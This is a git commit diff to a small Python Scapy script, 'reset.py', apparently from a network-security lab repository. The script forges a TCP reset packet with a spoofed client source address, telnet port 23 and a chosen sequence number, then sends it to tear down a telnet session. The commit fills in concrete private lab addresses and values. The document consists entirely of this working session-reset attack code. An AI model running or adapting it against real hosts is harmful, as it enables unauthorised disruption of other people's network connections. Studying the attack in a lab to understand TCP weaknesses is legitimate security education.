5797eb5595c220f2fbde6097756b4d2aa2ae50aa
FishRainBlow <82390676+FishRainBlow@users.noreply.github.com>
2024-07-29 20:29:48 +0800

    Update reset.py

--- Code Files/reset.py
+++ Code Files/reset.py
@@ -2,8 +2,8 @@ import sys
 from scapy.all import *
 
 print("sending reset packet...")
-IPLayer = IP (src="CLIENT's IP", dst = "SERVER's IP")
-TCPLayer = TCP (sport=46578, dport=23, flags="R", seq=159936073)
+IPLayer = IP (src="10.10.10.200", dst = "10.10.10.197")
+TCPLayer = TCP (sport=55850, dport=23, flags="R", seq=1361443090)
 pkt=IPLayer/TCPLayer
 ls(pkt)
 send(pkt,verbose=0)
